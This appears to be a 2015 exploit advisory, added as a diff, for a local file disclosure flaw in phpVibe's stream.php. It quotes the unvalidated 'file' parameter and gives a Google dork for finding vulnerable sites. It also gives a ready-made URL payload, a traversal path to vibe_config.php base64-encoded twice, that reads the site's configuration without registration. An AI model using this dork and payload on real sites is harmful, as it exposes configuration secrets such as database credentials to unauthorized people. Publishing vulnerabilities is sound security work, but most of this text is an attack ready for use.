@@ -1,0 +1,25 @@
+## In The Name Of ALLAH ##
+# Exploit Title: phpVibe ALL versions LFD vulnerability
+# Google Dork: "powered by phpvibe"
+# Date: 2015/07/13 (july 13th)
+# Exploit Author: ali ahmady -- Iranian Security Researcher (snip3r_ir[at]hotmail.com)
+# Vendor Homepage: http://www.phpvibe.com/
+# Software Link: http://get.phpvibe.com/
+# Version: All versions
+# Tested on: linux
+# greetings : VIRkid, b0x, phantom_x, Ch3rn0by1 
+
+
+stream.php
+====================================
+$token = htmlspecialchars(base64_decode(base64_decode($_GET["file"])));
+
+file parameter has no validation and sanitization!
+exploition can be performed by adding "@@media" to the file name and base64 it two times as below (no registration needed):
+
+http://domain.tld/stream.php?file=../vibe_config.php@@media ==> http://domain.tld/stream.php?file=TGk0dmRtbGlaVjlqYjI1bWFXY3VjR2h3UUVCdFpXUnBZUT09
+
+=====================================
+
+
+
